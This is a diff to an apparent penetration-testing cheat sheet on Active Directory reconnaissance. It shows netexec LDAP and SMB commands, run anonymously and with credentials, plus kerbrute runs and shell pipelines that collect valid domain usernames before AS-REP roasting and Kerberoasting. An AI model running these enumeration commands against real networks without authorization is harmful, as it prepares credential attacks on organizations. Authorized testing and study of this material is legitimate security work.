@@ -53,6 +53,7 @@ sudo hwclock --systohc
 ```sh
 # LDAP user descriptions and usernames.
 nxc ldap <DC_IP> -u '' -p '' --query '(objectclass=user)' '' | awk '/description/{desc=substr($0,index($0,$6));valid=(desc!~/Built-in account for guest access to the computer\/domain/)} /sAMAccountName/&&valid{ if(!seen[$6]++){ printf "[+]Description: %-30s User: %s\n", desc, $6 } valid=0 }'
+
 nxc ldap <DC_IP> -u '' -p '' --query '(objectclass=user)' '' | grep sAMAccountName | awk '{print $6}'
 
 # Anonymous/guest SMB shares.
@@ -75,6 +76,17 @@ kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST> -o kerbrute.txt
 
 # Extract valid users, dedupe, append only new users.  
 grep -a "VALID USERNAME:" kerbrute.txt | awk -F'[@ ]+' '{print tolower($(NF-1))}' | sort -u | grep -vxFf users.txt >> users.txt
+```
+
+## Username Enum (with cred)
+```shell
+nxc smb <DC_IP> -u <USER> -p '<PASS>' --users > real_users.txt
+# Extract user, dedupe, append only new users.
+awk '{print $5}' real_users.txt | grep -E '^[A-Za-z][A-Za-z.]+$' | tr '[:upper:]' '[:lower:]' | sort -u | grep -vxFf users.txt >> users.txt
+
+nxc ldap <DC_IP> -u <USER> -p '<PASS>' --users > real_users.txt
+# Extract user, dedupe, append only new users.
+awk '{print $5}' real_users.txt | grep -E '^[A-Za-z][A-Za-z.]+$' | tr '[:upper:]' '[:lower:]' | sort -u | grep -vxFf users.txt >> users.txt
 ```
 
 ## AS-REP Roast / Kerberoast
